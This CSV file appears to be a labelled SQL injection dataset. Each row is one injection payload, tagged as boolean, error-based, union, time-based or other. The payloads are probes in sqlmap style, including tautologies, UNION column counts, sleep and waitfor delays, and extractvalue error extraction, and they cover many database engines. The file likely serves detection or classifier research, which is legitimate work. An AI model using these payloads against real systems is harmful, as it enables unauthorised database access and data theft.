source_line,family,payload
6343,boolean,"1'  )   where 3703  =  3703 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"
6344,boolean,"1'   )    )    as owcw where 1107  =  1107 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --"
6345,error,"1'+  (  select 'fpnz' where 1592  =  1592 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'"
6346,boolean,"1  )   as hywx where 1424  =  1424 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"
6347,error,"1  )   where 1559  =  1559 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --"
6348,boolean,"1' where 9994  =  9994 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
6349,boolean,"1  )   as qeav where 8127  =  8127 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --"
6350,boolean,"-1583'  )   or elt  (  1032  =  1032,3623  )   and   (  'jrcj' like 'jrcj"
6351,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#"
6352,boolean,"-9676 or elt  (  1032  =  1032,3623  )  # jcaq"
6353,other,"iif  (  2976  =  2976,1,1/0  )  "
6354,error,"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""xyjg""  =  ""xyjg"
6355,boolean,"-6636'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'kgip'  =  'kgip"
6356,boolean,"1   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  8018  =  8018"
6357,time,1'||  (  select 'xwbo' from dual where 1263  =  1263 waitfor delay '0:0:5'  )  ||'
6358,union,"1'+  (  select ugvj where 2593  =  2593 union all select null,null,null,null,null#"
6359,error,"1'  )   as yuqv where 6007  =  6007 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --"
6360,boolean,"1  )   as rbmn where 5948  =  5948 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --"
6361,union,-6109 union all select 6784--
6362,boolean,"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""oyou""  =  ""oyou"
6363,other,"1""  )   as nfpe where 2679  =  2679"
6364,other,select   (  case when   (  8233  =  1074  )   then 8233 else 1/  (  select 0  )   end  )  --
6365,other,"1""  )   as hsws where 6656  =  6656"
6366,boolean,"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'ywxc'  =  'ywxc"
6367,error,"1' in boolean mode  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  #"
6368,boolean,"1' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
6369,error,"1,extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   "
6370,time,1'  )   as xrap where 5523  =  5523 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
6371,boolean,1  )   as pqle where 4039  =  4039 and 7533  =  7533--
6372,boolean,"1""   )    )    as jmoy where 9676  =  9676 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --"
6373,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp"
6374,other,-8023' in boolean mode  )   order by 1#
6375,boolean,"-4205'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  "
6376,boolean,1 where 5828  =  5828 and   (  3020  =  3020  )  *6703--
6377,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--
6378,boolean,1  )   and   (  3020  =  3020  )  *6703
6379,boolean,"1   )    )    as aqpy where 4027  =  4027 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
6380,boolean,"-9136'  )   or make_set  (  9354  =  9354,7185  )  "
6381,boolean,"1   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"
6382,boolean,"1%'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   '%'  =  '"
6383,boolean,-2303'   )    )    as exyt where 2528  =  2528 or 8571  =  8571--
6384,boolean,"1   )    )    as wmxa where 6485  =  6485 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"
6385,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
6386,error,"1""  )   as uyms where 6210  =  6210 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --"
6387,other,1' where 6583  =  6583
6388,boolean,"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""bnyh""  =  ""bnyh"
6389,boolean,"-5210""  )   where 7176  =  7176 or 6872  =  6872--"
6390,boolean,"1'   )    )    and make_set  (  1002  =  3556,3556  )   and    (    (   'mfao'  =  'mfao"
6391,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --"
6392,time,"1%""  )   waitfor delay '0:0:5' and   (  ""%""  =  """
6393,other,select   (  case when   (  9030  =  9185  )   then 9030 else 9030*  (  select 9030 from information_schema.character_sets  )   end  )  #
6394,union,"1'   )    )    union all select null,null,null,null,null#"
6395,boolean,"1""  )   as cxwd where 5800  =  5800 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"
6396,boolean,"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  "
6397,union,"1""  )   as boeh where 2571  =  2571 union all select null#"
6398,union,"1'  )   union all select null,null,null,null,null,null,null,null#"
6399,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  "
6400,other,1'||  (  select 'bupa' from dual where 8548  =  8548
6401,other,1' where 1844  =  1844
6402,boolean,"1  )   as udjn where 6871  =  6871 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"
6403,time,1'  )   as nftr where 8825  =  8825 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
6404,error,"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'fgox' like 'fgox"
6405,union,"-1166'   )    )    as icdz where 1042  =  1042 union all select 1042,1042,1042,1042,1042#"
6406,boolean,"1' or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --"
6407,boolean,1 where 2672  =  2672 and 1819  =  4322#
6408,boolean,-5861'  )   or 1581  =  2611 and   (  'mvjh' like 'mvjh
6409,boolean,"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #"
6410,other,"select * from generate_series  (  3827,3827,case when   (  3827  =  7095  )   then 1 else 0 end  )   limit 1--"
6411,union,"-4865 where 1386  =  1386 union all select 1386,1386,1386,1386#"
6412,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu
6413,other,1 where 6434  =  6434
6414,boolean,"-4005' where 3963  =  3963 or elt  (  1032  =  1032,3623  )  --"
6415,boolean,"1"" where 4082  =  4082 and elt  (  5699  =  1432,1432  )  --"
6416,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #"
6417,boolean,"1'||  (  select 'fcnb' where 2869  =  2869 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'"
6418,union,1   )    )    union all select null--
6419,error,-6179   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   7732  =  7732
6420,boolean,"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl"
6421,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--"
6422,boolean,"1%""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """
6423,error,"1""   )    )    as qode where 2398  =  2398 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --"
6424,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '"
6425,boolean,"1%'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '"
6426,error,1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'hgwt' like 'hgwt
6427,boolean,"1   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  3504  =  3504"
6428,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   "
6429,boolean,"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  4003  =  4003"
6430,boolean,"-2067"" or 3038  =  3038"
6431,boolean,"1'||  (  select 'dujx' where 6896  =  6896 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"
6432,error,"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  #"
6433,boolean,"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  "
6434,time,"1   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"
6435,union,"1'  )   as asjj where 1721  =  1721 union all select null,null,null,null,null,null--"
6436,union,"-4286%""   )    )     )   union all select 2229,2229,2229,2229,2229,2229#"
6437,error,"1,  (  select   (  case when   (  8674  =  7896  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  "
6438,time,1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   '%'  =  '
6439,other,"1""   )    )    as exzo where 7518  =  7518   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --"
6440,time,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'gbhd'  =  'gbhd"
6441,other,"1""  )   as nyzd where 5305  =  5305"
6442,other,select case when 3819  =  1887 then 1 else null end--
6443,error,1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) 
6444,error,"1""  )   where 5850  =  5850 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --"
6445,boolean,-1602' or 3038  =  3038
6446,boolean,-2361'   )    )    as mzhv where 2905  =  2905 or 9026  =  5388--
6447,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #"
6448,boolean,1  )   as lvfu where 5831  =  5831 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --
6449,boolean,"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  5215  =  5215"
6450,time,1'||  (  select 'pyga' from dual where 8501  =  8501 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
6451,time,1' where 9708  =  9708 or sleep  (  5  )  --
6452,boolean,-2504'   )    )     )   or 8723  =  9715
6453,time,"1""   )    )    as whyr where 9731  =  9731 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --"
6454,error,"1""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""ngnd"" like ""ngnd"
6455,union,"-1148""   )    )    union all select 5442,5442,5442,5442#"
6456,boolean,"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""dacx""  =  ""dacx"
6457,time,1%'   )    )    and sleep  (  5  )   and    (    (   '%'  =  '
